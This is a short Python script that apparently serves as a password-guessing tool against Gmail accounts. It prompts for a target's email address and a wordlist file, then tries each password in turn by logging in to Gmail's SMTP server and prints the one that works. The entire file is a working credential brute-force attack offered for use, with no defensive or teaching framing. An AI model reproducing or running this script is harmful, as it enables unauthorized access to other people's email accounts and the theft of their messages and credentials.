#!/usr/bin/python

import smtplib

smtpserver= smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter Targets Email Address: ")
passwdfile = input("Enter the path to the password file: ")
file = open(passwdfile, "r")

for password in file:
	password=password.strip('\n')
	try:
		print(password)
		smtpserver.login(user, password)
		print("Password Found: %s" % password)
		break
	except smtplib.SMTPAuthenticationError:
		print("Password is not %s" % password)
